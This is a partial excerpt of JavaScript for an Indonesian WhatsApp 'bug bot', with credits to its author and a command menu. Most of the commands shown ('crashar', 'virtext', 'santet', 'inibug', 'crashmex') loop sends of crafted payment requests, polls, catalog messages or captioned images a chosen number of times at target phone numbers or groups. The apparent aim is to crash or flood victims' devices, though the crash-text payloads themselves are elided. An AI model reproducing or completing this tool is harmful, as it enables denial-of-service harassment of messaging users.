/*
// Buat Lu Yang al Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°Hw Mods : Copyan Dari Base Dika

› Create By © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢
› Base Ori © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢
› Copyan Base Dika Hisoka Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA : © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°*/
...
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
//=================================================//
try {
...
break
case 'jadikatalog': case '𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸katalog': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
...
let teks = `${q}`
{
haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢`,"body": `Selamat ${salam} kak ${pushname}`,
...
//=================================================//
//=================================================//
case 'inibug': case '𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸jhon': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
break
case '𝚃𝟺𝙼𝚉poll': case '𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸jhon2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢",
"options": [
{
...
{
"optionName": "SALAM BROTHER BY © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢"
}
],
...
break
//=================================================//
case '𝚃𝟺𝙼𝚉troli2': case '𝚃𝟺𝙼𝚉trol': case 'jutrol': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
...
break
case '𝚃𝟺𝙼𝚉troli3': case '𝚃𝟺𝙼𝚉trol2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
...
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢`,
}
}}), { userJid: m.chat, quoted: doc})
...
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
//=================================================//
case '𝚃𝟺𝙼𝚉daca': case '𝚃𝟺𝙼𝚉daca':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
for (let i = 0; i < jumlah; i++) {
 ...
 haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
//=================================================//
case '𝚃𝟺𝙼𝚉docu': case '𝚃𝟺𝙼𝚉draknes':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
break
//=================================================//
case 'duc': case '𝚃𝟺𝙼𝚉slebew': case 'cumadocu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
break
//=================================================//
case '𝚃𝟺𝙼𝚉virtext1': case '𝚃𝟺𝙼𝚉zsu': case 'crashar1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°${iphone}` }, { quoted: doc })
}
}
break
case '𝚃𝟺𝙼𝚉virtext2': case '𝚃𝟺𝙼𝚉tol': case 'crashar2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°${iphone1}` }, { quoted: doc })
}
}
break
case '𝚃𝟺𝙼𝚉virtext3': case '𝚃𝟺𝙼𝚉memek': case 'crashar3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°${iphone2}` }, { quoted: doc })
}
}
break
case '𝚃𝟺𝙼𝚉virtext4': case '𝚃𝟺𝙼𝚉contol': case 'crashar4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°${iphone3}` }, { quoted: doc })
}
}
break
case '𝚃𝟺𝙼𝚉virtext5': case '𝚃𝟺𝙼𝚉textv': case 'crashar5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°${iphone4}` }, { quoted: doc })
}
}
break
case '𝚃𝟺𝙼𝚉virtext6': case '𝚃𝟺𝙼𝚉gas': case 'crashar6':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°${iphone5}` }, { quoted: doc })
}
}
break
case '𝚃𝟺𝙼𝚉virtext7': case '𝚃𝟺𝙼𝚉virtext': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
...
┗━━⊱
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
© °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢`, contextInfo:{"externalAdReply": {"title": `SC °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
...
┣❏afk { kasih reactions }
┣❏𝚃𝟺𝙼𝚉ghoib [ on / off ]
┣❏𝚃𝟺𝙼𝚉jagoan [ reply target ]
┣❏𝚃𝟺𝙼𝚉sange [ Harus Menjadi Admin ]
...
┣❏crashmex 628xxx|5|5
┣❏𝚃𝟺𝙼𝚉skuy 628xxx
┣❏𝚃𝟺𝙼𝚉santet 628xxx@s.whatsapp.net|10|10s
┣❏catalogpc 628xxx@s.whatsapp.net|10|10s
┗━━⊱[°𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°]
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Ketik > m.chat ( di group dulu )
┏━━⊱[ GROUP ]
┣❏gas𝚃𝟺𝙼𝚉 112674448xxx
┣❏𝚃𝟺𝙼𝚉santetgc  1237891xxxx@g.us|10|10s
...
┗━━⊱[°𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°]`,
contextInfo:{"externalAdReply": {"title": `SC °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
...
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© © °𝚃𝟺𝙼𝚉_𝙷𝟺𝚇𝟶𝟶𝚁_𝟸𝟶𝟸𝟸°WE ARE NOT MASTOD`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
